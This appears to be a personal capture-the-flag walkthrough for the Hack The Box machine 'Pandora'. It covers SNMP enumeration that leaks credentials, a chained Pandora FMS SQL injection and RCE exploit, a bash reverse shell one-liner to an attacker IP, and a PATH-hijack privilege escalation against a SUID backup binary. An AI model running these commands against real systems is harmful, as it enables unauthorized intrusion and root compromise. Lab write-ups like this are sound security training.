# Take Away
- Shell session has problem with `setuid()`. The reason are explained in the `Byond Root` section in the post by `0xdf`.
	- `AssignedUserId` with `MPM ITK Apache module`
	- https://0xdf.gitlab.io/2022/05/21/htb-pandora.html
# Metadata
- `onesixtyone` will find the SNMP community string being `public`.![[Pasted image 20240303162920.png]]
	- Further enumeration with community string and `nmap` will find a pair of plaintext credential `daniel:HotelBabylon23`![[Pasted image 20240303163349.png]]
- Enumerate as `daniel` and looking at `/etc/apache2/sites-enabled/pandora.conf` will find another virtual host `pandora.panda.htb` only listening at `localhost:80` and is running as local user `matt`.![[Pasted image 20240303164035.png]]
	- Set up `local port forward` with `ssh -v -N -L 8080:127.0.0.1:80 daniel@10.10.11.136` and add `127.0.0.1 pandora.panda.htb` to `/etc/hosts` to access the virtual host.
- Upon visiting `http://pandora.panda.htb:8080/`, one can identify it is running `Pandora FMS v7.0NG.742_FIX_PERL2020`![[Pasted image 20240303164521.png]]
	- A little googling can find an `unauthenticated SQLi(CVE-2021-32099)` that allows authentication bypass to get admin access. Furthermore, there is one `authenticated RCE(CVE-2020-5844)` that requires admin access. When chained together, RCE can be achieved. 
	- There is already an exploit that work out of the box on GitHub `https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated`  
# Exploitation
## Shell as daniel
- Using the found credential, run `ssh daniel@10.10.11.136` to obtain a SSH session.
## Shell as matt
- Download the Git Repository and run `python3 sqlpwn.py -t 127.0.0.1:8080` to get a interactive web shell.
	- Upgrade the shell by setting up listener and run `/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.23/443 0>&1'`. However, the web shell is kind wonky. So I opt for manual command using `burp`.![[Pasted image 20240303175737.png]]
# PrivEsc
- `linpeas` will identify a `SUID` binary called `pandora_backup` under `/usr/bin`. Upon examining the content, we can see that it trying to run `tar` without an absolute path specified.![[Pasted image 20240303195644.png]]
- However, the current shell session has problem with `setuid()`. The reason are explained in the `Byond Root` section in the post by `0xdf`.
	- https://0xdf.gitlab.io/2022/05/21/htb-pandora.html
	- ![[Pasted image 20240303195835.png]]
- Hence, one needs to drop in SSH public and private key pair to be able to get a  SSH session as `matt` so `setuid()` functions properly.
- With the new session, run `echo -e '#!/bin/bash\n\nbash -p -i' > /dev/shm/tar;chmod +x /dev/shm/tar;export PATH=/dev/shm:$PATH` to hijack relative path.
- Finally, run `pandora_backup` to obtain a root shell.
